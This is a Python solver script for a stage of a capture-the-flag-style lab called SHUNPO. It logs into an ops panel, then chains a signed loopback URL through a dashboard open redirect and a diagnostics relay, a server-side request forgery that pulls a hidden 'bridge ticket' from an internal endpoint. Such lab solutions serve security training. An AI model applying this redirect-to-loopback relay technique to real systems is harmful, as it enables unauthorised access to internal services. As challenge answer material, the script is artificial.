#!/usr/bin/env python3
"""
SHUNPO Token 4 solver

Purpose:
    Authenticate to the ops panel, use the HTTP relay as intended, and recover
    the bridge ticket from the structured relay response.

This version is production-oriented:
    - does not depend on the PCCC token format
    - extracts the bridge ticket from the returned JSON structure
    - refreshes CSRF after detail-mode changes
    - includes useful error handling and debug options

Expected flow:
    1. Log into the ops panel with Token 1 as the password
    2. Optionally switch detail mode to extended
    3. Build the signed loopback target for /internal/brief
    4. Wrap it in the dashboard maintenance jump URL
    5. Sign the full first-hop URL with Token 3
    6. Submit the HTTP relay form
    7. Extract bridge_ticket from the returned JSON response
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import html
import json
import re
import secrets
import sys
import time
import urllib.parse
from typing import Any

import requests


def sign(message: str, key: str) -> str:
    return hmac.new(
        key.encode("utf-8"),
        message.encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()


def extract_csrf(page: str) -> str:
    patterns = [
        r'name="csrf"\s+value="([^"]+)"',
        r"name='csrf'\s+value='([^']+)'",
        r'value="([^"]+)"\s+name="csrf"',
    ]
    for pattern in patterns:
        match = re.search(pattern, page)
        if match:
            return html.unescape(match.group(1))
    raise RuntimeError("Could not extract CSRF token from page")


def extract_pre_blocks(text: str) -> list[str]:
    return [
        html.unescape(match.group(1))
        for match in re.finditer(
            r"<pre[^>]*>(.*?)</pre>",
            text,
            flags=re.DOTALL | re.IGNORECASE,
        )
    ]


def find_json_objects(text: str) -> list[dict[str, Any]]:
    objects: list[dict[str, Any]] = []

    # First try JSON-looking <pre> blocks, which is how the relay commonly renders results.
    for block in extract_pre_blocks(text):
        candidate = block.strip()
        try:
            parsed = json.loads(candidate)
            if isinstance(parsed, dict):
                objects.append(parsed)
        except Exception:
            pass

    # Fallback: broad brace search for embedded JSON objects.
    for match in re.finditer(r"\{.*?\}", text, flags=re.DOTALL):
        candidate = html.unescape(match.group(0))
        try:
            parsed = json.loads(candidate)
            if isinstance(parsed, dict):
                objects.append(parsed)
        except Exception:
            continue

    return objects


def extract_bridge_ticket_from_response(page: str) -> str:
    """
    Extract the intended Token 4 value based on solver semantics, not token format.

    Prefer:
      1. bridge_ticket
      2. token

    because Token 4 is supposed to be recovered as the bridge ticket from the
    relay response.
    """
    for obj in find_json_objects(page):
        bridge_ticket = obj.get("bridge_ticket")
        if isinstance(bridge_ticket, str) and bridge_ticket.strip():
            return bridge_ticket.strip()

        token = obj.get("token")
        if isinstance(token, str) and token.strip():
            return token.strip()

    raise RuntimeError("Could not find bridge_ticket or token in relay response")


def login(session: requests.Session, base_url: str, username: str, password: str) -> str:
    login_url = f"{base_url.rstrip('/')}/login"

    response = session.get(login_url, timeout=10)
    response.raise_for_status()

    response = session.post(
        login_url,
        data={
            "username": username,
            "password": password,
        },
        timeout=10,
        allow_redirects=True,
    )
    response.raise_for_status()

    if (
        "/dashboard" not in response.url
        and "Sign out" not in response.text
        and "Operations Dashboard" not in response.text
        and "Ops Panel" not in response.text
    ):
        raise RuntimeError("Login appears to have failed")

    return extract_csrf(response.text)


def set_detail_mode(
    session: requests.Session,
    base_url: str,
    csrf: str,
    mode: str = "extended",
) -> str:
    response = session.post(
        f"{base_url.rstrip('/')}/settings/detail-mode",
        data={
            "csrf": csrf,
            "mode": mode,
            "next": "/dashboard",
        },
        timeout=10,
        allow_redirects=True,
    )
    response.raise_for_status()
    return extract_csrf(response.text)


def build_targets(
    token2: str,
    token3: str,
    dashboard_base: str,
    ops_loopback_base: str,
    nonce: str | None = None,
) -> tuple[str, str, str, str]:
    ts = str(int(time.time()))
    chosen_nonce = nonce or secrets.token_hex(8)

    inner_sig = sign(f"{token2}:{ts}:{chosen_nonce}", token3)

    loopback_target = (
        f"{ops_loopback_base.rstrip('/')}/internal/brief?"
        f"rk={urllib.parse.quote(token2, safe='')}"
        f"&ts={urllib.parse.quote(ts, safe='')}"
        f"&nonce={urllib.parse.quote(chosen_nonce, safe='')}"
        f"&sig={urllib.parse.quote(inner_sig, safe='')}"
    )

    first_hop = (
        f"{dashboard_base.rstrip('/')}/maintenance/jump?"
        f"next={urllib.parse.quote(loopback_target, safe='')}"
    )

    outer_sig = sign(first_hop, token3)
    return ts, chosen_nonce, first_hop, outer_sig


def submit_relay(
    session: requests.Session,
    base_url: str,
    csrf: str,
    route_key: str,
    target: str,
    sig: str,
) -> str:
    relay_url = f"{base_url.rstrip('/')}/diagnostics/relay"
    response = session.post(
        relay_url,
        data={
            "csrf": csrf,
            "target": target,
            "route_key": route_key,
            "sig": sig,
        },
        timeout=15,
        allow_redirects=True,
    )
    response.raise_for_status()
    return response.text


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve SHUNPO Token 4 (Relay Restore)")
    parser.add_argument(
        "--ops-base",
        default="http://sp-ops.ninja:8080",
        help="Ops panel base URL",
    )
    parser.add_argument(
        "--dashboard-base",
        default="http://sp-dashboard.ninja:3000",
        help="Dashboard base URL",
    )
    parser.add_argument(
        "--ops-loopback-base",
        default="http://127.0.0.1:8080",
        help="Loopback base used by the relay target",
    )
    parser.add_argument(
        "--username",
        default="opsadmin",
        help="Ops panel username",
    )
    parser.add_argument(
        "--token1",
        required=True,
        help="Token 1 / ops panel password",
    )
    parser.add_argument(
        "--token2",
        required=True,
        help="Token 2 / route key",
    )
    parser.add_argument(
        "--token3",
        required=True,
        help="Token 3 / internal signing key",
    )
    parser.add_argument(
        "--nonce",
        default=None,
        help="Optional fixed nonce",
    )
    parser.add_argument(
        "--no-extended",
        action="store_true",
        help="Do not switch detail mode to extended",
    )
    parser.add_argument(
        "--debug-html",
        action="store_true",
        help="Print the relay HTML before parsing the response",
    )

    args = parser.parse_args()

    session = requests.Session()
    session.headers.update({"User-Agent": "shunpo-token4-solver/1.0"})

    try:
        csrf = login(session, args.ops_base, args.username, args.token1)
        print("[+] Logged into ops panel")

        if not args.no_extended:
            csrf = set_detail_mode(session, args.ops_base, csrf, "extended")
            print("[+] Switched detail mode to extended")

            # Refresh the dashboard once to keep session state/csrf aligned with the UI flow.
            response = session.get(f"{args.ops_base.rstrip('/')}/dashboard", timeout=10)
            response.raise_for_status()
            csrf = extract_csrf(response.text)

        ts, nonce, first_hop, outer_sig = build_targets(
            token2=args.token2,
            token3=args.token3,
            dashboard_base=args.dashboard_base,
            ops_loopback_base=args.ops_loopback_base,
            nonce=args.nonce,
        )

        print(f"[+] Timestamp: {ts}")
        print(f"[+] Nonce:     {nonce}")
        print(f"[+] First hop:  {first_hop}")
        print(f"[+] Outer sig:  {outer_sig}")

        relay_html = submit_relay(
            session=session,
            base_url=args.ops_base,
            csrf=csrf,
            route_key=args.token2,
            target=first_hop,
            sig=outer_sig,
        )

        if args.debug_html:
            print("----- RELAY RESPONSE HTML START -----")
            print(relay_html)
            print("----- RELAY RESPONSE HTML END -----")

        token4 = extract_bridge_ticket_from_response(relay_html)
        print(f"[+] Token 4 / bridge ticket: {token4}")
        return 0

    except requests.RequestException as exc:
        print(f"[-] HTTP error: {exc}", file=sys.stderr)
        return 1
    except Exception as exc:
        print(f"[-] Solver failed: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())